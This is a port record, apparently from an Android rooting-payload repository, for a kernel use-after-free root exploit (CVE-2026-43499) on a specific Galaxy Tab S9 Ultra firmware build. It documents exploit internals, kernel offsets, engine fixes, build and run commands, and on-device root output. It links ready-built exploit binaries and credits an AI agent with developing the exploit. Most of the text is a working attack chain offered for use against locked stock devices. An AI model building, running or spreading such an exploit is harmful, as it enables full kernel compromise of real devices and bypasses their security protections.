# Galaxy Tab S9 Ultra SM-X916B / X916BXXS6EZG3 port record

This record contains the exact inputs, derived values, and full reproduction
steps for the Snapdragon 8 Gen 2 (Kalama/SM8550) Galaxy Tab S9 Ultra profile
`gts9u-X916BXXS6EZG3`. **Full root was achieved and verified on real
hardware** using this profile. This is the same SoC generation as
`dm3q-S9180ZHS8FZF5`/`dm3q-S918BXXSAFZF5` (Galaxy S23 Ultra), which made
those the closest available reference points, but no offset in this profile
was assumed equal to theirs without independent verification against this
device's own kernel image — see the MCAST derivation section below for a
worked example of why some values ended up numerically identical anyway.

## Device identity

```text
model: SM-X916B
device: gts9u
region/CSC: EGY (X916BOXM6EZG3)
AP/PDA build: X916BXXS6EZG3
display build: BP4A.251205.006.X916BXXS6EZG3
fingerprint: samsung/gts9uxxx/gts9u:16/BP4A.251205.006/X916BXXS6EZG3:user/release-keys
security patch level: 2026-07-05
kernel release: 5.15.189-android13-8-33413632-abX916BXXS6EZG3
Android version: 16
page size: 4096
bootloader/verified boot: locked, green (stock, unmodified throughout)
```

Port requested in issue [#243](https://github.com/BuSung-dev/Root-My-Galaxy-Payloads/issues/243).

## Engine base

This profile is built on top of the MCAST/SIGRETURN stack-writer engine from
PR [#227](https://github.com/BuSung-dev/Root-My-Galaxy-Payloads/pull/227)
(`X-15/Root-My-Galaxy-Payloads` branch `dm3q-s918b-fzf5`, itself stacked on
PR [#223](https://github.com/BuSung-dev/Root-My-Galaxy-Payloads/pull/223) by
`johnny-salz`). **This PR is stacked on #227** in the same sense #227 was
stacked on #223: the diff includes the engine changes and will shrink once
#227 merges. Chosen as the base because it is the most real-hardware-proven
route for this kernel/CVE combination at the time of writing, and because
S23 Ultra (dm3q, same Kalama/SM8550 platform, same 5.15.189 kernel) is the
closest real device to a Tab S9 Ultra.

Route: `pselect6`-based stack reclaim (the originally-documented technique)
was tested extensively on this device first and found to crash reliably and
unrecoverably at the write stage — consistent with community findings
(issues [#160](https://github.com/BuSung-dev/Root-My-Galaxy-Payloads/issues/160),
[#239](https://github.com/BuSung-dev/Root-My-Galaxy-Payloads/issues/239)) that
`pselect6` is fundamentally unsuited to several 5.15-kernel devices, not a
tunable per-device offset problem. **MCAST** (a single
`setsockopt(AF_INET6, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, ...)` call
copying a large attacker-controlled buffer onto the kernel stack in one
shot) avoids `pselect6`'s fragile multi-syscall race window entirely and is
the technique that ultimately succeeded here.

## MCAST_WAITER_OFF derivation (independently verified against this kernel)

Derived via full static disassembly of this device's own `vmlinux.elf`
(recovered via `vmlinux-to-elf` + BTF), not copied from another profile.
Methodology mirrors the one documented in `dm3q-S918BXXSAFZF5`'s own target
header:

**Futex side** — absolute stack address of the live `rt_mutex_waiter`
during `futex_wait_requeue_pi`, measured from the generic per-syscall entry
stack pointer `E`:

| Function | Frame size |
| --- | ---: |
| `do_el0_svc` | `0x10` |
| `el0_svc_common` | `0x30` |
| `invoke_syscall` | `0x20` |
| `__arm64_sys_futex` | `0x80` |
| `do_futex` | `0x140` |
| `futex_wait_requeue_pi` | `0x1b0` |

The waiter itself lives at `sp+0x98` inside `futex_wait_requeue_pi`'s own
frame (confirmed by the `add x1/x2, sp, #0x98` arguments passed to
`remove_waiter`/`try_to_take_rt_mutex`). Absolute address: `E - 0x338`.

**Setsockopt/MCAST side** — absolute stack address of the `struct
group_source_req` buffer that `setsockopt()` copies from userspace:

| Function | Frame size |
| --- | ---: |
| `__arm64_sys_setsockopt` | `0x10` |
| `__sys_setsockopt` | `0x70` |
| `sock_common_setsockopt` | `0x10` |
| `ipv6_setsockopt` | `0x40` |
| `do_ipv6_setsockopt` | `0x2c0` |

The buffer (`greqs`) lives at `sp+0x40` inside `do_ipv6_setsockopt`'s frame
(confirmed by the `add x3, sp, #0x40` argument passed to `ip6_mc_source`).
Absolute address: `E - 0x3b0`.

```text
MCAST_WAITER_OFF = (E - 0x338) - (E - 0x3b0) = 0x78
```

This lands on exactly the same value `dm3q-S918BXXSAFZF5` derived
independently for itself — not a coincidence: both call chains (syscall
entry, futex core, net/ipv6 stack) are 100% generic Android13/GKI kernel
code, untouched by Samsung/SoC-vendor customization at this patch level, so
the frame-size arithmetic is identical across any device sharing this exact
kernel version, regardless of model. Confirmed empirically on-device across
multiple separate boots: `slide mcast returned ... offset=0x78 ...
errno=99 (EADDRNOTAVAIL) ... sched_ok=1 window=1` — the engine's own defined
success signal for the write landing correctly.

## Other offsets

All values below were independently confirmed via BTF/kallsyms against this
device's own `vmlinux.elf`; several turned out byte-identical to
`dm3q-S918BXXSAFZF5`'s, which is expected for generic sched/locking/
workqueue structs untouched by Samsung customization at this kernel version
(`FAKE_WAITER_*`, `FAKE_TASK_*`, `POOL_*`, `CFG_*`, `WQ_*`), while the
`.text`-derived function offsets below are genuinely per-build and differ
from every other profile in this repository:

| Macro | Offset |
| --- | ---: |
| `INIT_TASK_OFF` | `0x02c05080` |
| `ROOT_TASK_GROUP_OFF` | `0x02cb9ac0` |
| `SELINUX_ENFORCING_OFF` | `0x02d8e5c0` |
| `KMALLOC_CACHES_OFF` | `0x020646b8` |
| `ANON_PIPE_BUF_OPS_OFF` | `0x01e7f6a0` |
| `SYSTEM_UNBOUND_WQ_OFF` | `0x02a90800` |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | `0x001045d0` |
| `ASHMEM_FOPS_OFF` | `0x0200d6f8` |
| `ASHMEM_MISC_FOPS_OFF` | `0x02bfcf28` |
| `CONFIGFS_READ_ITER_OFF` | `0x005d7420` |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | `0x005d7e48` |
| `COPY_SPLICE_READ_OFF` | `0x00528198` |
| `NOOP_LLSEEK_OFF` | `0x004bbd34` |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF` | `0x0010db44` |
| `P0_KERNEL_PHYS_LOAD` | `0x80080000` |

`MM_STRUCT_SZ=0x3e0` and the 3-type `enum kmalloc_cache_type`
(`KMALLOC_CGROUP_TYPE=1`, `KMALLOC_CACHE_TYPES=3`, no `CONFIG_ZONE_DMA`)
were confirmed via BTF; the unoverridden upstream defaults assume a
4-type/`0x500`-size kernel and are wrong for this device.

## Three engine bugs found and fixed while integrating this profile

Ported engines carry assumptions from their origin device that don't always
hold. These three were found, diagnosed with on-device evidence, and fixed
as part of getting this profile working — all are generic engine fixes, not
gts9u-specific hacks, and should benefit any future port using this base:

1. **`kernelsnitch_find_collisions()` baseline-noise bug**
   (`src/kernelsnitch/kernelsnitch.h`). The timing-side-channel threshold
   was computed from a single two-sample baseline measurement, which on
   this device's real-world scheduling noise sometimes caught a spike
   (`approx_time=42`) far above the true floor (`min=13`), causing a
   genuine ~30x collision signal (`max=413`) to be missed. Fixed by taking
   `MIN` across `KERNELSNITCH_BASELINE_SAMPLES` (8) samples instead of 1,
   and requiring `KERNELSNITCH_COLLISION_CONFIRMATIONS` (3) consecutive
   threshold-crossings before accepting a collision — this confirmation
   gate already existed in the code but was dead-gated behind
   `APP_REQUIRE_FRESH_P0_SESSION`; it is now unconditional.
2. **Reclaim-mechanism regression.** The `APP_CONTROLLED_MM_GROUP_RECLAIM`
   variant (a different, narrower spray/reclaim shape than the classic
   pre/post/spray-context KernelSnitch reclaim) was silently the active
   path when porting from a profile that used it, even though it was never
   validated on this device's own timing characteristics. This profile
   explicitly disables it (`APP_CONTROLLED_MM_GROUP_RECLAIM 0`) to use the
   existing, separately-proven classic reclaim path instead. It may be
   faster once tuned for a given device; that's a separate project.
3. **Retry-budget starvation, and a genuine fatal-exit bug.**
   `SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS`/`FOPS_KERNEL_PAGE_SETUP_ATTEMPTS`
   default to 2 for `APP_PAYLOAD` builds; this device's KernelSnitch
   timing side-channel genuinely needs up to ~25-30 inner retries to land
   (consistent with the technique's own peer-reviewed characterization —
   Maar et al., NDSS'25, 2-61.5s even on a 24-core desktop). Raised to
   24/72. Separately and more importantly, `prepare_pipe_buffer_page()`'s
   failure path (a *different* KernelSnitch leak, for the physical-RW pipe
   oracle) used `pr_error()`, which unconditionally calls `exit(-1)` — the
   entire exploit process died on the very first failure of this
   probabilistic step, with no chance for any wrapping retry loop to ever
   run. This was the actual root cause of several "clean failure, no
   crash" attempts that looked like tuning problems but weren't fixable by
   raising a counter alone. Fixed by demoting both relevant call sites in
   `src/pipe.c` to `pr_warning()` + a clean `return 0`, and adding a real
   12-attempt retry loop around the first call site in `src/fops.c`
   (previously a single unretried shot).

A `FINE_TICKS_OVERRIDE` env var was also added to `slide_app.c` to let the
per-attempt calibrated write-timing delay be set directly for diagnostics,
bypassing the normal `S23_SUPERVISOR_ATTEMPT`-indexed lookup.

## Reliability

Across roughly a dozen full attempts on the fixed build, the writer stage
(MCAST write) itself succeeded about half the time when reached — the other
half crash cleanly at `writer-enter` with no further output before the
device reboots, a real, inherent property of racing a genuine kernel
use-after-free, not a bug (the fake waiter offset itself was independently
verified correct via the `window=1`/`sched_ok=1` signal on every successful
write, always at `offset=0x78`). **Locked bootloader + verified boot means
every crash observed during this entire port (more than a dozen, across two
techniques) was a clean, full recovery with zero side effects** — confirmed
repeatedly via fresh `uptime`/`getprop sys.boot_completed` checks
immediately after each recovery.

Expect to need a small number of reboot+retry cycles per session, consistent
with `dm3q-S918BXXSAFZF5`'s own documented experience ("it took 4 tries").

## Validation state: real hardware, full root achieved

```
$ adb shell "CVE43499_ROOT_HELPER=/data/local/tmp/cve-2026-43499-root \
    LD_PRELOAD=/data/local/tmp/cve-2026-43499-app.so /system/bin/id"
[... full chain log, ending in ...]
pipe physrw pid=14700 done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
exploit completed attempt=1/8

$ adb shell /data/local/tmp/cve-2026-43499-root -c id
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
```

Confirmed clean afterward (Knox not tripped, bootloader untouched, verified
boot fully intact):

```
$ adb shell /data/local/tmp/cve-2026-43499-root -c \
    'getprop ro.boot.warranty_bit; getprop ro.boot.flash.locked; \
     getprop ro.boot.verifiedbootstate; getprop ro.boot.vbmeta.device_state'
0
1
green
locked
```

Build/run commands:

```sh
make TARGET=gts9u-X916BXXS6EZG3 API=33 ANDROID_NDK_HOME=<ndk-25.1.8937393-path>
adb shell "EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 \
    CVE43499_ROOT_HELPER=/data/local/tmp/cve-2026-43499-root \
    LD_PRELOAD=/data/local/tmp/cve-2026-43499-app.so /system/bin/id"
```

(`API=33` because the NDK used has no `android35-clang`; the API level is a
compat floor and doesn't affect what the resulting binary can run on. The
`EXPLOIT_ATTEMPT_TIMEOUT_SEC` override is needed so the raised retry budgets
above have room to actually run to completion.)

Artifact published at `artifacts/gts9u-X916BXXS6EZG3/cve-2026-43499-app.so`
(SHA-256 `5ae092363e91a118711465238d5f95d6a815d53b3456afae7e367289ed322863`),
paired with the `su_daemon`-based root client/helper at
`artifacts/gts9u-X916BXXS6EZG3/cve-2026-43499-root` (SHA-256
`c2cd542c4de02c611ddd1f8a98f5adbfc584ee3cfae52bfaab36ca8a894e084f`). Both
rebuild byte-identically from this branch.

## p0_fingerprint.h validation status

`src/targets/gts9u-X916BXXS6EZG3/p0_fingerprint.h` is present (required for
the file to compile in `APP_PAYLOAD` builds) but **has not been exercised on
real hardware**: the successful root chain documented above used the
tracefs-based KASLR leak throughout, so the physical-fingerprint-oracle
fallback path this file supports was never actually taken. Treat its
contents as unverified until someone confirms the fallback path itself
(e.g. by testing from a real `untrusted_app` context where tracefs is
unavailable).

## KernelSU: not yet functional on this device — known gap

A gts9u-specific KernelSU `.ko` was built (vermagic-matched, symbol-audited:
212/212 versioned imports clean against this exact kernel), but it fails to
load. `dmesg` shows the real cause once the module's raw `init_module`
result (`-ENOENT`, which `insmod`/toybox reports as the misleading "No such
file or directory") is decoded:

```
kernelsu: Unknown symbol policydb_read (err -2)
kernelsu: Unknown symbol avtab_search_node (err -2)
kernelsu: Unknown symbol security_context_to_sid (err -2)
[... ~20 more, all SELinux-internal (security/selinux/ss/*) symbols]
```

This is a different, deeper category of problem than the CRC/version
mismatches this repository already has a documented workaround for
(patching `check_version` via the exploit's own arbitrary-R/W primitive at
`insmod` time — see `dm3q-S9180ZHS8FZF5`'s port record). These symbols are
not merely version-mismatched, they are entirely absent from this kernel's
exported symbol table — KernelSU's SELinux-policy-patching code needs
internal SELinux functions this stock Samsung kernel never exports via
`EXPORT_SYMBOL`. Resolving this would mean patching the module to resolve
these specific functions via raw `kallsyms`-derived addresses instead of
normal module linking — a real, separate reverse-engineering task, flagged
here for whoever picks it up next rather than attempted in this PR.

**The underlying root primitive is fully functional without KernelSU**:
`cve-2026-43499-root -c <command>` (default/client mode of the same
`su_daemon`-based binary used above) talks directly to the UMH-installed
root daemon and returns a genuine root shell (`uid=0`,
`context=u:r:kernel:s0`) for the remainder of that boot.

## Credits

- Device, ADB access, guidance, and testing judgment throughout: `nourgaser`
  (own device, authorized security research).
- All reverse-engineering, code, on-device testing, diagnosis, and this
  writeup: Claude (Anthropic), operating as an agent in this session.
- Engine base: `X-15` (PR #227) and `johnny-salz` (PR #223), and the whole
  `BuSung-dev/Root-My-Galaxy-Payloads` community whose parallel work on
  S23-family devices this session's research drew on directly (issues
  #160, #239; PRs #223, #227, #231, #237, #196, #143).
- KernelSnitch technique: Lukas Maar et al., ["KernelSnitch: Leaking and
  Compromising the Linux Kernel via Software Side-Channels"](https://lukasmaar.github.io/papers/ndss25-kernelsnitch.pdf)
  (NDSS'25).
